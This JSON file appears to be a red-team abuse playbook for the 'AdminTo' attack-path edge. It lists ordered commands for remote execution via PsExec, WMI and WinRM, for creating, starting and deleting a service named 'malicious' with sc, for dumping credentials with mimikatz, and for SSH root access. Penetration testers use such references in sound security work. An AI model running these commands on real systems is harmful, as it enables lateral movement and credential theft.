{
    "AdminTo": {
        "meaning": "This edge indicates that principal is a local administrator on the target computer.",
        "common": "",
        "windows": {
            "PsExec": [
                {
                    "order": 1,
                    "command": "psexec.exe \\\\target-computer -u domain\\user -p password cmd",
                    "description": "Execute commands on remote system via PsExec"
                }
            ],
            "WMI": [
                {
                    "order": 1,
                    "command": "wmic /node:target-computer /user:domain\\user /password:password process call create \"cmd.exe\"",
                    "description": "Execute commands on remote system via WMI"
                }
            ],
            "WinRM": [
                {
                    "order": 1,
                    "command": "winrs -r:target-computer -u:domain\\user -p:password cmd",
                    "description": "Execute commands on remote system via WinRM"
                }
            ],
            "ServiceManager": [
                {
                    "order": 1,
                    "command": "sc \\\\target-computer create malicious binpath= \"C:\\Windows\\System32\\calc.exe\"",
                    "description": "Create service on remote system"
                },
                {
                    "order": 2,
                    "command": "sc \\\\target-computer start malicious",
                    "description": "Start the created service"
                },
                {
                    "order": 3,
                    "command": "sc \\\\target-computer delete malicious",
                    "description": "Clean up - delete the service"
                }
            ],
            "CredentialGathering": [
                {
                    "order": 1,
                    "command": "sekurlsa::wdigest",
                    "description": "Extract wdigest credentials using mimikatz"
                },
                {
                    "order": 2,
                    "command": "sekurlsa::logonpasswords",
                    "description": "Extract logon passwords using mimikatz"
                }
            ]
        },
        "linux": {
            "SSH": [
                {
                    "order": 1,
                    "command": "ssh root@target-host",
                    "description": "SSH as root to target system"
                },
                {
                    "order": 2,
                    "command": "sudo su -",
                    "description": "Switch to root user if sudo access available"
                }
            ]
        }
    }
}
